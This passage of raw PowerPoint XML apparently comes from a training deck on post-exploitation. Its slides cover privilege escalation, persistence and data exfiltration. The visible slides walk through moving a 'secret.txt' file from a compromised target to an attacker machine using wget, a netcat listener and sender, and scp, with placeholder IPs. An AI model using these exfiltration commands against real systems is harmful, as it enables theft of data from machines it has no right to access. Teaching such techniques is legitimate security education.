              <a:t>wget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> http://&lt;TARGET-IP&gt;:8000/secret.txt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🔴 Method 2 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Netcat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📍 On Attacker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 err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>lvnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> 4444 &gt; secret.txt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📍 On Target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 err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> &lt;KALI-IP&gt; 4444 &lt; secret.txt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548E54-5C41-4F1E-8218-FED37F2DBC7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5336345" y="0"/>
            <a:ext cx="6367975" cy="444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🔴 Method 3 — SCP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📍 On Attacker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 err="1"/>
              <a:t>scp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> user@&lt;TARGET-IP&gt;:/path/to/secret.txt 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🎯 Final Result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Sensitive file successfully transferred from target → attacker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🧠 Key Concept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Exfiltration means moving valuable data off the compromised system</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8376004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176963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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    Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2145101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50800">
          <a:solidFill>
            <a:srgbClr val="B61264"/>
          </a:solidFill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2865</TotalTime>
  <Words>4954</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>678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Arial Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 5</vt:lpstr>
      <vt:lpstr>Task 01 : Linux Privilege Escalation (The Path to Root)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03</vt:lpstr>
      <vt:lpstr>Task 03: Establishing Persistence (Don’t Lose the Shell)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4</vt:lpstr>
      <vt:lpstr>Task 04: Post-Exploit Enumeration &amp; Data Exfiltration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Gh0stRift</dc:creator>
  <cp:lastModifiedBy>ad afda</cp:lastModifiedBy>
  <cp:revision>130</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-18T14:16:26Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-19T16:28:29Z</dcterms:modified>
</cp:coreProperties>
</file>